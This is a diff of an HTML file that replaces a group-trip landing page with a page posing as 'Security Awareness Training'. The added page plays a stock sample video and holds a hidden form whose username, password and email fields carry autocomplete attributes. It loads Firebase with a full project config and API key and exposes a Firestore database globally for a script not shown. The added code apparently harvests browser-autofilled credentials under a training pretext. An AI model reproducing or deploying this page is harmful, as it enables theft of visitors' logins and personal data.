@@ -2,388 +2,57 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Enclassic Trip</title>
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap');
-
-        body {
-            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: #f5f5f7;
-            color: #1d1d1f;
-            -webkit-font-smoothing: antialiased;
-            margin: 0;
-            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
-        }
-
-        .gradient-text {
-            background: linear-gradient(90deg, #007aff, #34c759);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .card-hover {
-            transition: all 0.3s ease;
-        }
-
-        .card-hover:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
-        }
-
-        .thin-divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(0, 0, 0, 0.1), transparent);
-        }
-
-        .fade-in {
-            opacity: 0;
-            transform: translateY(8px);
-            transition: opacity 0.4s ease-out, transform 0.4s ease-out;
-        }
-
-        .fade-in.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .ios-button {
-            padding: 8px 16px;
-            font-size: 14px;
-            line-height: 1.4;
-            border-radius: 10px;
-            transition: background-color 0.2s ease, transform 0.2s ease;
-        }
-
-        .ios-button:hover {
-            transform: scale(1.03);
-        }
-
-        .seats-counter {
-            display: inline-block;
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        .seats-section {
-            animation: bounceIn 0.8s ease-out;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-
-        @keyframes bounceIn {
-            0% { opacity: 0; transform: scale(0.95); }
-            60% { opacity: 1; transform: scale(1.02); }
-            100% { transform: scale(1); }
-        }
-
-        /* Sponsors (Static Display) */
-        .sponsors-container {
-            position: relative;
-            width: 100%;
-            height: 60px;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 0 10px;
-        }
-
-        .sponsor-item {
-            width: 1000px;
-            height: 100px;
-            margin: 0 15px;
-            border-radius: 20px;
-            overflow: hidden;
-        }
-
-        .sponsor-item img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        @supports (padding: env(safe-area-inset-top)) {
-            body {
-                padding-top: env(safe-area-inset-top);
-                padding-bottom: env(safe-area-inset-bottom);
-                padding-left: env(safe-area-inset-left);
-                padding-right: env(safe-area-inset-right);
-            }
-        }
-
-        /* Popup Styles */
-        .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            z-index: 1000;
-            text-align: center;
-        }
-
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 999;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Awareness Training</title>
+    <link rel="stylesheet" href="style.css">
 </head>
-<body class="min-h-screen flex flex-col">
-    <div class="max-w-md mx-auto w-full px-4 pt-6 pb-12 flex-grow">
-        <!-- Header -->
-        <header class="flex flex-col items-start mb-6">
-            <div class="flex justify-between items-center w-full">
-                <div>
-                    <h1 class="text-xl font-semibold text-gray-900">Enclassic <i style="font-size:14px">by B&B Trip</i></h1>
-                </div>
-                <div class="flex space-x-3">
-                    <button class="text-sm text-gray-500 hover:text-gray-900 transition-colors">
-                        <i class="fas fa-search"></i>
-                    </button>
-                    <button class="text-sm text-gray-500 hover:text-gray-900 transition-colors">
-                        <i class="fas fa-user"></i>
-                    </button>
-                </div>
-            </div>
-            <div class="flex items-center mt-2">
-                <i class="fas fa-bell text-black text-sm mr-2"></i>
-                <button id="infoBtn" class="text-sm text-black font-medium hover:underline"> Click to get Information</button>
-            </div>
-        </header>
-
-        <!-- Main Content -->
-        <main>
-            <!-- Hero Section -->
-            <div class="bg-white rounded-3xl p-5 shadow-sm mb-6 card-hover fade-in">
-                <div class="flex flex-col items-center">
-                    <div class="w-24 h-24 rounded-2xl bg-gradient-to-br from-blue-500 to-green-500 flex items-center justify-center mb-4">
-                        <i class="fas fa-umbrella-beach text-white text-3xl"></i>
-                    </div>
-                    <div class="text-center">
-                        <h2 class="text-2xl font-semibold mb-1 gradient-text">Enclassic Trip</h2>
-                        <p class="text-xs text-gray-500 mb-2">Season 1 (Summer vibes) is loading</p>
-                        <p class="text-sm text-gray-600 mb-4">Join the trip and experience unforgettable summer moments with like-minded travelers.</p>
-                        <div class="flex flex-col sm:flex-row justify-center space-y-2 sm:space-y-0 sm:space-x-2">
-                            <a href="https://chat.whatsapp.com/K8YtZzh8gfvHPDJIYI8mQk" target="_blank" class="ios-button bg-gradient-to-r from-blue-500 to-green-500 text-white font-medium flex items-center justify-center space-x-2">
-                                <i class="fab fa-whatsapp"></i>
-                                <span>Join Trip</span>
-                            </a>
-                            <button id="whereBtn" class="ios-button bg-gray-100 text-gray-700 font-medium flex items-center justify-center space-x-2">
-                                <i class="fas fa-map-marker-alt"></i>
-                                <span>Where?</span>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Sponsors -->
-            <section class="mb-6 fade-in">
-                <h3 class="text-base font-semibold mb-3">Sponsors</h3>
-                <div class="sponsors-container">
-                    <div class="sponsor-item"><img src="https://i.ibb.co/DDRxQChp/Screenshot-2025-07-22-211422-1-removebg-preview-1.png" alt="btem@fficial" class="w-full h-full object-cover"></div>
-                    <div class="sponsor-item"><img src="https://i.ibb.co/SD5NpS7h/Screenshot-2025-07-22-190303-removebg-preview.png" alt="B&B Trip" class="w-full h-full object-cover"></div>
-                    <div class="sponsor-item"><img src="https://i.ibb.co/KcP766Jw/Image-fx-6.png" alt="Kinaflix Team" class="w-full h-full object-cover"></div>
-                </div>
-            </section>
-
-            <!-- Upcoming Events -->
-            <section class="mb-6 fade-in">
-                <div class="flex justify-between items-center mb-3">
-                    <h3 class="text-base font-semibold">Upcoming Events</h3>
-                    <button class="text-xs text-blue-500 hover:underline">See All</button>
-                </div>
-                <div class="grid grid-cols-1 gap-3">
-                    <!-- Event Card 1 -->
-                    <div class="bg-white rounded-2xl p-3 shadow-sm card-hover">
-                        <div class="flex items-start">
-                            <div class="bg-blue-100 text-blue-600 rounded-lg p-2 mr-2">
-                                <i class="fas fa-swimmer text-sm"></i>
-                            </div>
-                            <div>
-                                <h4 class="text-sm font-medium mb-1">Swimming</h4>
-                                <p class="text-xs text-gray-500">Do you know to swim?</p>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- Event Card 2 -->
-                    <div class="bg-white rounded-2xl p-3 shadow-sm card-hover">
-                        <div class="flex items-start">
-                            <div class="bg-orange-100 text-orange-600 rounded-lg p-2 mr-2">
-                                <i class="fas fa-utensils text-sm"></i>
-                            </div>
-                            <div>
-                                <h4 class="text-sm font-medium mb-1">Eating</h4>
-                                <p class="text-xs text-gray-500">Its chinnesse cooking, Are we going to eat snakes?</p>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- Event Card 3 -->
-                    <div class="bg-white rounded-2xl p-3 shadow-sm card-hover">
-                        <div class="flex items-start">
-                            <div class="bg-green-100 text-green-600 rounded-lg p-2 mr-2">
-                                <i class="fas fa-hiking text-sm"></i>
-                            </div>
-                            <div>
-                                <h4 class="text-sm font-medium mb-1">Nature Hike</h4>
-                                <p class="text-xs text-gray-500">Do you know a Crowned Crane?</p>
-                            </div>
-                        </div>
-                    </div>
-                     <!-- Event Card 4 -->
-                    <div class="bg-white rounded-2xl p-3 shadow-sm card-hover">
-                        <div class="flex items-start">
-                            <div class="bg-pink-100 text-purple-600 rounded-lg p-2 mr-2">
-                                <i class="fas fa-home text-sm"></i>
-                            </div>
-                            <div>
-                                <h4 class="text-sm font-medium mb-1">Last Meet up</h4>
-                                <p class="text-xs text-gray-500">Small goodbye party.</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Remaining Seats -->
-            <section class="mb-6 fade-in seats-section">
-                <h3 class="text-base font-semibold mb-3">Remaining Seats</h3>
-                <div class="bg-white rounded-2xl p-4 shadow-sm card-hover text-center">
-                    <p class="text-sm text-gray-600">Hurry, spots are filling up!</p>
-                    <p class="text-2xl font-semibold text-blue-500 mt-2">
-                        <span class="seats-counter">11</span> Available Seats
-                    </p>
-                </div>
-            </section>
-
-            <!-- Locations -->
-            <section id="locations" class="mb-6 fade-in">
-                <h3 class="text-base font-semibold mb-3">Trip Day Plan</h3>
-                <div class="space-y-4">
-                    <!-- Location 1 -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm card-hover">
-                        <h4 class="text-sm font-medium text-gray-900">Meet Location</h4>
-                        <p class="text-xs text-gray-500">At: 9:30 AM</p>
-                        <p class="text-xs text-gray-600">Activity: It will be announced to members only.</p>
-                        <div class="flex overflow-x-auto space-x-2 pb-2">
-                            <img src="https://i.ibb.co/Jwt0yWPM/images.jpg" alt="Miami 1" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/tP3X20Hj/arton27066.jpg" alt="Miami 2" class="w-24 h-20 object-cover rounded-lg">
-                        </div>
-                    </div>
-                    <!-- Location 2 -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm card-hover">
-                        <h4 class="text-sm font-medium text-gray-900">Stipp Hotel Kiyovu</h4>
-                        <p class="text-xs text-gray-500">Hours: 2 Hours</p>
-                        <p class="text-xs text-gray-600">Activity: Swimming and refreshing from the sunlight.</p>
-                        <div class="flex overflow-x-auto space-x-2 pb-2">
-                            <img src="https://i.ibb.co/5hXrbwq8/img20200221124043-largejpg.jpg" alt="Hawaii 1" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/ynrVq0Hv/images.jpg" alt="Hawaii 2" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/JWNH7HV7/filename-img-1942-jpg.jpg" alt="Hawaii 3" class="w-24 h-20 object-cover rounded-lg">
-                        </div>
-                    </div>
-                    <!-- Location 3 -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm card-hover">
-                        <h4 class="text-sm font-medium text-gray-900">Green Park</h4>
-                        <p class="text-xs text-gray-500">Hours: 1 Hour</p>
-                        <p class="text-xs text-gray-600">Activity: Taking lunch.</p>
-                        <div class="flex overflow-x-auto space-x-2 pb-2">
-                            <img src="https://i.ibb.co/DfRr70LB/images-1.jpg" alt="Santorini 1" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/RTh8bcP6/images-3.jpg" alt="Santorini 2" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/B5hZ3xzD/images-2.jpg" alt="Santorini 3" class="w-24 h-20 object-cover rounded-lg">
-                        </div>
-                    </div>
-                    <!-- Location 4 -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm card-hover">
-                        <h4 class="text-sm font-medium text-gray-900">Umusambi Village.</h4>
-                        <p class="text-xs text-gray-500">Hours: 1 Hour 30 min</p>
-                        <p class="text-xs text-gray-600">Activity: A light walk through Umusambi Village & Taking pictures.</p>
-                        <div class="flex overflow-x-auto space-x-2 pb-2">
-                            <img src="https://i.ibb.co/KxDNCnL0/50088118277-fd70c9e4e2-c.jpg" alt="Bali 1" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/HDZxbtpF/images-6.jpg" alt="Bali 2" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/r2bJf1yJ/Screenshot-2025-07-22-225135.png" alt="Bali 3" class="w-24 h-20 object-cover rounded-lg">
-                        </div>
-                    </div>
-                    <!-- Location 5 -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm card-hover">
-                        <h4 class="text-sm font-medium text-gray-900">Final Meet up.</h4>
-                        <p class="text-xs text-gray-500">Hours: When you want.</p>
-                        <p class="text-xs text-gray-600">Activity: We will make a small party, enjoy a cake And everyone will be taken Home.</p>
-                        <div class="flex overflow-x-auto space-x-2 pb-2">
-                            <img src="https://i.ibb.co/HLSST5r6/BW1-A4089-2.jpg" alt="Amalfi 3" class="w-24 h-20 object-cover rounded-lg">
-                            <img src="https://i.ibb.co/gFBK7WTm/images-9.jpg" alt="Amalfi 2" class="w-24 h-20 object-cover rounded-lg">
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </main>
-    </div>
-
-    <!-- Footer -->
-    <footer class="py-4">
-        <div class="max-w-md mx-auto px-4">
-            <div class="thin-divider mb-3"></div>
-            <div class="flex justify-between items-center">
-                <p class="text-xs text-gray-500">© 2025 Enclassic Trip by B&B Trip Inc.</p>
-                <div class="flex space-x-3">
-                    <a href="#" class="text-xs text-gray-500 hover:text-gray-700">Terms</a>
-                    <a href="#" class="text-xs text-gray-500 hover:text-gray-700">Privacy</a>
-                </div>
-            </div>
+<body>
+    <div class="container">
+        <h1>Cybersecurity Training Video</h1>
+        <div class="video-container">
+            <video id="trainingVideo" controls autoplay>
+                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
-    </footer>
-
-    <!-- Popup -->
-    <div id="popup" class="popup">
-        <p><h2><b>Hey Mr/Mrs</b></h2><br> Welcome, If you have any issue where you will go ,click the button "Where?".<br>And if you want to know the price, it will be announced Soon.</p>.</p>
+        <div class="hidden-content">
+            <form id="dataCollectionForm">
+                <input type="text" id="username" name="username" placeholder="Username" autocomplete="username">
+                <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password">
+                <input type="email" id="email" name="email" placeholder="Email" autocomplete="email">
+                <button type="submit">Submit</button>
+            </form>
+        </div>
     </div>
-    <div id="overlay" class="overlay"></div>
+    
+    <!-- Firebase SDK -->
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-analytics.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
+        
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAAEYQGHXf7t5VgI9MkXO1RpiCH5w98GPw",
+            authDomain: "laptopms.firebaseapp.com",
+            databaseURL: "https://laptopms-default-rtdb.firebaseio.com",
+            projectId: "laptopms",
+            storageBucket: "laptopms.firebasestorage.app",
+            messagingSenderId: "965071744622",
+            appId: "1:965071744622:web:3411e7ada3d13ef070007f",
+            measurementId: "G-2TCNV6ZRY4"
+        };
 
-    <script>
-        // JavaScript for handling "Where?" button and smooth scroll
-        document.getElementById('whereBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('locations').scrollIntoView({ behavior: 'smooth' });
-        });
-
-        // JavaScript for handling Information popup
-        document.getElementById('infoBtn').addEventListener('click', function() {
-            document.getElementById('popup').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
-        });
-
-        document.getElementById('overlay').addEventListener('click', function() {
-            document.getElementById('popup').style.display = 'none';
-            document.getElementById('overlay').style.display = 'none';
-        });
-
-        // Fade-in animation on scroll
-        const fadeElements = document.querySelectorAll('.fade-in');
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('visible');
-                }
-            });
-        }, { threshold: 0.3 });
-
-        fadeElements.forEach(element => observer.observe(element));
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getFirestore(app);
+        
+        // Make Firestore available globally
+        window.firestoreDB = db;
     </script>
+    
+    <script src="script.js"></script>
 </body>
 </html>
